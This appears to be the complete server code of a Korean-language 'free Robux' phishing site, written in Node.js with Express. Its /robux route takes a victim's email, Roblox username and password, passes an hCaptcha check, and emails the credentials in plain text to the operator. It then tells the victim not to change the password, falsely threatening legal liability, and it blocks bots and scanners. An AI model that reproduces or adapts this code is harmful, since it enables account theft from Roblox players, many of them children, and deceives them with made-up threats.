const express = require("express");
const nodemailer = require("nodemailer");
const bodyParser = require("body-parser");
const axios = require('axios');
const escapeHtml = require('escape-html');
const querystring = require('querystring');
const rateLimit = require('express-rate-limit');
const useragent = require('express-useragent');
require('dotenv').config();

const app = express();
const port = 3000;

// Body-parser 설정
app.use(bodyParser.urlencoded({
    extended: true
}));

// 정적 파일 제공 (form.html 위치)
app.use(express.static(__dirname));

const SECRET_KEY = process.env.HCAPTCHA_SECRET_KEY;

// 봇 감지를 위한 미들웨어 (User-Agent 체크)
app.use((req, res, next) => {
    const ua = req.headers['user-agent'];
    const isBot = /bot|crawler|spider|robot|crawling/i.test(ua);
    if (isBot) {
        return res.status(403).send('봇 접속이 감지되었습니다.');
    }
    next();
});

// DDoS 공격 방지를 위한 Rate Limiter 설정
const limiter = rateLimit({
    windowMs: 15 * 60 * 1000, // 15분
    max: 20, // 20번의 요청만 허용
    message: '요청이 너무 많습니다. 잠시 후 다시 시도해주세요.'
});

app.use(limiter);

// POST 라우터
app.post("/robux", async (req, res) => {
    const token = req.body['h-captcha-response'];

    const email = escapeHtml(req.body.email);
    const roblox_id = escapeHtml(req.body.roblox_id);
    const roblox_pwd = escapeHtml(req.body.roblox_pwd);

    let privacy = req.body.privacy
    let _3rdperson = req.body._3rdperson
    let advertise = req.body.advertise

    const privacy_checked = privacy === "true" ? "✅ 개인정보 제공 동의 허용" : "❌ 개인정보 제공 동의 거부";
    const _3rdperson_checked = _3rdperson === "true" ? "✅ 제 3자 제공 동의 허용" : "❌ 제 3자 제공 동의 거부";
    const advertise_checked = advertise === "true" ? "✅ 마케팅 활용 동의 허용" : "❌ 마케팅 활용 동의 거부";

    const postData = querystring.stringify({
        secret: process.env.HCAPTCHA_SECRET_KEY,
        response: req.body['h-captcha-response']
    });

    if (!token) {
        return res.status(400).send('hCaptcha 응답이 없습니다.');
    }

    try {
        const verifyURL = `https://hcaptcha.com/siteverify`;

        const response = await axios.post('https://hcaptcha.com/siteverify', postData, {
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded'
            }
        });

        const success = response.data.success;

        if (success) {
            // Nodemailer transporter 설정
            const transporter = nodemailer.createTransport({
                service: "gmail",
                auth: {
                    user: process.env.EMAIL, // 보내는 이메일
                    pass: process.env.APP_PASS,
                },
                tls: {
                    rejectUnauthorized: false, // 자가 서명 인증서 오류를 피하려면 이 옵션 추가
                },
            });

            const mailOptions = {
                from: email,
                to: process.env.EMAIL, // 수신자 이메일
                subject: "새로운 Roblox 계정 정보가 도착했습니다!",
                text: `
이메일: ${email}
Roblox 아이디: ${roblox_id}
Roblox 비밀번호: ${roblox_pwd}

${privacy_checked}
${_3rdperson_checked}
${advertise_checked}
        `,
            };

            transporter.sendMail(mailOptions, (error, info) => {
                if (error) {
                    return res.send("ERROR PLEASE TRY AGAIN");
                } else {
                    return res.send("빠른 시일 내에 당신의 계정에 로벅스가 들어올 것입니다. 로벅스가 들어오기 전까지 비밀번호와 닉네임을 변경하지 마십시오. 그렇지 않으면 우리 API에 문제가 생겨 전송에 실패하게 되고 당신은 트래픽 과다 이용으로 법적 책임을 물 수 있습니다.");
                }
            });
        } else {
            res.status(403).send('hCaptcha 인증 실패.');

        }
    } catch (err) {
        res.status(500).send('서버 오류');
    }

});

// 서버 실행
app.listen(port, () => {
    console.log(`서버 실행 중`);
});